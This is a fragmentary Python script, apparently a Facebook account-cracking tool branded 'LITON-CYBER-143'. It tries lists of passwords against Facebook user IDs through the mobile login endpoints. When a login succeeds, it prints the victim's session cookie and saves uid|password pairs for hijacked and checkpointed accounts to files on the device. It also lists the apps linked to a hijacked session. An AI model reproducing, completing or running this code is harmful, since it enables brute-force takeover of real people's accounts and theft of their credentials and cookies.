...
def cek_apks(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r\r {G}[🐼] Active Apks & Web ðŸ‘‡{G}       ')
    ...
    if len(game)==0:
        ...
        print(f'\r\r [{M}🐼{P}]{M} Expired Apks & Web ðŸ‘‡{P}')
        for i in range(len(game)):
            print(f"\r\r {K}[%s]{K} %s %s"%(i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

logo =("""\033[1;37m
\033[1;97m88     88 888888  dP"Yb  \033[1;91m 88b 88 
\033[1;97m88     88   88   dP   Yb  \033[1;91m88Yb88 
\033[1;97m88  .o 88   88   Yb   dP  \033[1;91m88 Y88 
\033[1;97m88ood8 88   88    YbodP   \033[1;91m88  Y8 
\033[1;90m———————————————————————————————————
 \033[1;97m[\033[47m\033[1;92m>)\x1b[0m\033[1;97m OWNER       : LITON(ᗒᗣᗕ)՞
 \033[1;97m[\033[47m\033[1;92m>)\x1b[0m \033[1;97mFACEBOOK    : M.M Ail Liton 
 \033[1;97m[\033[47m\033[1;92m>)\x1b[0m \033[1;97mGITHUB      : \033[1;92mLITON-404
 \033[1;97m[\033[47m\033[1;92m>)\x1b[0m \033[1;97 VERSION      : 0.1 
\033[1;90m———————————————————————————————————""")
loop = 0
oks = []
cps = []
...
try:
    ...
    print(' WELCOME TO LITON🐼-CYBER-143 WORLD ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[LITON🐼-OK] '+uid+ ' | ' +ps+ '\n\033[1;37m[\033[38;5;46mCOOKIE\033[38;5;196m🐼\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/LITON🐼-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[LITON🐼-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/LITON🐼-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def bcrack(uid,pwx,tl,fb):
    ...
    try:
        for ps in pwx:
            ...
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':f'{fb}.facebook.com',
            'upgrade-insecure-requests': '1',
            'viewport-width': '980',
            'method': 'path',
            'scheme': 'https',
